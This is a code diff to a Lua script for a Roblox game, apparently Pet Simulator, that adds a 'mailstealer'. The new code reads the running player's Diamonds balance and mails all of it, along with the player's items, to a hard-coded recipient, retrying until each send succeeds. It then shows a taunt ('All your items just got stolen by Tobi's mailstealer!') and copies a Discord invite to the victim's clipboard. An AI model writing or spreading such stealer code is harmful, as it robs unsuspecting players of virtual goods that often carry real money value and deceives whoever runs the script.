@@ -16,6 +16,14 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+local GemAmount1 = 0
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
+    end
+end
+
 local function formatNumber(number)
     if number == nil then
         return "0"
@@ -167,6 +175,27 @@ local function sendItem(category, uid, am)
 	until response == true
 end
 
+local function SendAllGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+			if GemAmount1 >= 500 then
+				local args = {
+					[1] = user,
+					[2] = MailMessage,
+					[3] = "Currency",
+					[4] = i,
+					[5] = GemAmount1
+				}
+				local response = false
+				repeat
+					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+				until response == true
+				break
+			end
+        end
+    end
+end
+
 local function ClaimMail()
     local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     while err == "You must wait 30 seconds before using the mailbox!" do
@@ -207,7 +236,12 @@ if #sortedItems > 0 then
         SendMessage(plr.Name, GemAmount1)
     end)
 
+    SendAllGems()
+
     for _, item in ipairs(sortedItems) do
         sendItem(item.category, item.uid, item.amount)
     end
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    setclipboard("discord.gg/GY2RVSEGDT")
 end
